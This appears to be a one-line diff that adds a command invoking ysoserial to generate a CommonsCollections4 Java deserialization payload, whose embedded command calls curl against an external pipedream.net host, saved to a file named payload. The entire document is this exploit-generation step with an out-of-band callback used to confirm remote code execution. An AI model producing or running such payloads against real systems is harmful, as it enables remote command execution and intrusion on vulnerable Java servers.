@@ -1,0 +1,1 @@
+java -jar ysoserial-all.jar CommonsCollections4 "curl https://en78y6i7k2183.x.pipedream.net" > payload
